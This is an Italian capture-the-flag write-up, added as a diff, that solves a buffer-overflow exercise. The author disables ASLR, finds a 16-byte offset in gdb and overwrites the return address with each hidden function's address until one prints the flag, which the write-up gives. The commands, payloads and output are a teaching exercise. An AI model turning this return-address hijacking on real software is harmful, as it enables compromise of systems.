@@ -1,0 +1,122 @@
+Esercizio 3 - pwn
+
+Unzippo il file dato, aggiungo i permessi di esecuzione al file e disabilito l'ASLR con i seguenti comandi
+
+$ unzip secret_func1.zip
+$ chmod +x ./secret_func1
+
+root$ echo 0 > /proc/sys/kernel/randomize_va_space
+
+A questo punto lancio il programma con gdb 
+
+$ gdb secret_func1
+
+Proseguo a cercare il byte di overflow del programma facendo alcuni tentativi col comando lanciato dal debugger gdb
+
+(gdb) run $(perl -e 'print "A"x100')
+
+E noto che con 100 A va in segmentation fault e mi sovrascrive completamente l'indirizzo di ritorno
+
+Program received signal SIGSEGV, Segmentation fault.
+0x41414141 in ?? ()
+
+Faccio una serie di tentativi per trovare con più precisione esattamente da che byte inizia a riscrivere l'indirizzo di ritorno, e trovo che al diciassettesimo byte inizia a sovrascrivere l'indirizzo
+
+(gdb) run $(perl -e 'print "A"x17')
+Program received signal SIGSEGV, Segmentation fault.
+0x56550041 in ?? ()
+
+Quindi il mio payload finale sarà di 16 A e 4 B per sovrascrivere la variabile dell'indirizzo con esattamente 4 B, dimostrando di saper sovrascrivere l'indirizzo di ritorno
+
+(gdb) run $(perl -e 'print "A"x16, "BBBB"')
+Program received signal SIGSEGV, Segmentation fault.
+0x42424242 in ?? ()
+
+Sempre da gdb, con il comando info functions trovo le funzioni caricate per l'esecuzione del programma, e controllo i nomi per cercare funzioni utilizzabili per lanciare un exploit
+
+Trovo le seguenti funzioni sospette e i loro indirizzi:
+
+0x565561ad  super_secret
+0x56556300  super_function
+0x56556450  secret_function
+0x565565aa  super_hidden
+0x56556724  super_senza_piombo
+0x56556877  secret
+
+E proseguo a riscrivere l'indirizzo di ritorno del programma con l'indirizzo di queste funzioni ottentendo i seguenti risultati
+(L'indirizzo va scritto al contrario per via del Little Endian)
+
+0x565561ad  super_secret
+
+(gdb) run $(perl -e 'print "A"x16, "\xad\x61\x55\x56"')
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Starting program: /home/kali/Downloads/ESPWN/secret_func1 $(perl -e 'print "A"x16, "\xad\x61\x55\x56"')
+[Thread debugging using libthread_db enabled]
+Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
+Ritenta
+[Inferior 1 (process 44398) exited normally]
+
+
+0x56556300  super_function
+
+(gdb) run $(perl -e 'print "A"x16, "\x00\x63\x55\x56"')
+Starting program: /home/kali/Downloads/ESPWN/secret_func1 $(perl -e 'print "A"x16, "\x00\x63\x55\x56"')
+[Thread debugging using libthread_db enabled]
+Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
+?�����%p�
+[Inferior 1 (process 45815) exited with code 016]
+(gdb) run $(perl -e 'print "A"x16, "\x10\x63\x55\x56"')
+Starting program: /home/kali/Downloads/ESPWN/secret_func1 $(perl -e 'print "A"x16, "\x10\x63\x55\x56"')
+[Thread debugging using libthread_db enabled]
+Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
+
+Program received signal SIGSEGV, Segmentation fault.
+0x56556315 in super_function ()
+
+
+0x56556450  secret_function
+
+(gdb) run $(perl -e 'print "A"x16, "\x50\x64\x55\x56"')
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Starting program: /home/kali/Downloads/ESPWN/secret_func1 $(perl -e 'print "A"x16, "\x50\x64\x55\x56"')
+[Thread debugging using libthread_db enabled]
+Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
+Casu Marzu
+[Inferior 1 (process 46543) exited normally]
+
+
+0x565565aa  super_hidden
+
+(gdb) run $(perl -e 'print "A"x16, "\xaa\x65\x55\x56"')
+Starting program: /home/kali/Downloads/ESPWN/secret_func1 $(perl -e 'print "A"x16, "\xaa\x65\x55\x56"')
+[Thread debugging using libthread_db enabled]
+Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
+Sardinia State Sponsored CTF
+[Inferior 1 (process 47265) exited normally]
+
+
+
+0x56556724  super_senza_piombo
+
+(gdb) run $(perl -e 'print "A"x16, "\x24\x67\x55\x56"')
+Starting program: /home/kali/Downloads/ESPWN/secret_func1 $(perl -e 'print "A"x16, "\x24\x67\x55\x56"')
+[Thread debugging using libthread_db enabled]
+Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
+Ritenta
+[Inferior 1 (process 47843) exited normally]
+
+
+0x56556877  secret
+
+(gdb) run $(perl -e 'print "A"x16, "\x77\x68\x55\x56"')
+Starting program: /home/kali/Downloads/ESPWN/secret_func1 $(perl -e 'print "A"x16, "\x77\x68\x55\x56"')
+[Thread debugging using libthread_db enabled]
+Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
+SEC{simple_buffer_overflow_with_secret_7unction}
+[Inferior 1 (process 48158) exited normally]
+
+Flag trovata
+SEC{simple_buffer_overflow_with_secret_7unction}
+
